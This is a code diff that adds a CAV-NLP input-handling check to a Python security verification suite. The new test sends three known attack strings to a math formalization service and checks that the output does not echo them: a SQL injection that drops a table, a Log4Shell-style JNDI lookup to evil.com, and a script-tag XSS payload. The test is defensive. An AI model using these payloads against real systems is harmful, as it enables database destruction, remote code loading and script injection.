@@ -23,7 +23,7 @@ import asyncio
 import time
 import traceback
 import re
-from typing import Any, Dict, List
+from typing import Any, Dict, List, Optional
 
 # CAV-NLP integration imports
 try:
@@ -37,13 +37,24 @@ except ImportError:
 
 
 class SecurityVerifier:
-    """Security and robustness verification suite."""
+    """Security and robustness verification suite with CAV-NLP validation."""
     
-    def __init__(self):
+    def __init__(self, config: Optional[Dict] = None):
         self.passed = 0
         self.failed = 0
         self.warnings = 0
         self.critical = 0
+        # CAV-NLP configuration
+        self.config = config or {}
+        self.use_cav_nlp = self.config.get("use_cav_nlp", True) and CAV_NLP_AVAILABLE
+        self.math_service = None
+        self.enhanced_solver = None
+        if self.use_cav_nlp:
+            try:
+                self.math_service = UnifiedMathService()
+                self.enhanced_solver = EnhancedZ3Solver()
+            except Exception:
+                self.use_cav_nlp = False
     
     def test(self, name: str, condition: bool, level: str = "normal", msg: str = ""):
         """Record test result."""
@@ -79,6 +90,7 @@ class SecurityVerifier:
         await self.verify_api_security()
         await self.verify_dependency_security()
         await self.verify_secret_management()
+        await self.verify_cav_nlp_security()
         
         self.print_summary()
     
@@ -463,6 +475,31 @@ class SecurityVerifier:
         except Exception as e:
             self.test("Secret management check", False, "normal", str(e))
     
+    async def verify_cav_nlp_security(self):
+        """Verify CAV-NLP security."""
+        print("\n11. CAV-NLP Security Validation")
+        
+        if not self.use_cav_nlp:
+            self.warn("CAV-NLP Security", "CAV-NLP not available, skipping")
+            return
+        
+        # Test 11.1: Malicious input handling
+        malicious_inputs = [
+            "'; DROP TABLE users; --",
+            "${jndi:ldap://evil.com}",
+            "<script>alert('xss')</script>",
+        ]
+        
+        for malicious in malicious_inputs:
+            try:
+                result = self.math_service.formalize(malicious)
+                # If we get here, check the result doesn't contain the malicious content
+                result_str = str(result).lower()
+                has_malicious = any(m.lower() in result_str for m in ['drop table', 'jndi', '<script>'])
+                self.test(f"CAV-NLP handles malicious input: {malicious[:20]}...", not has_malicious, "critical")
+            except Exception:
+                self.test(f"CAV-NLP handles malicious input: {malicious[:20]}...", True, "critical", "Exception caught")
+    
     def print_summary(self):
         """Print verification summary."""
         print("\n" + "="*70)
@@ -472,6 +509,7 @@ class SecurityVerifier:
         print(f"Failed:     {self.failed}")
         print(f"Warnings:   {self.warnings}")
         print(f"Critical:   {self.critical}")
+        print(f"CAV-NLP:    {'available' if self.use_cav_nlp else 'not available'}")
         
         total = self.passed + self.failed + self.critical
         if total > 0:
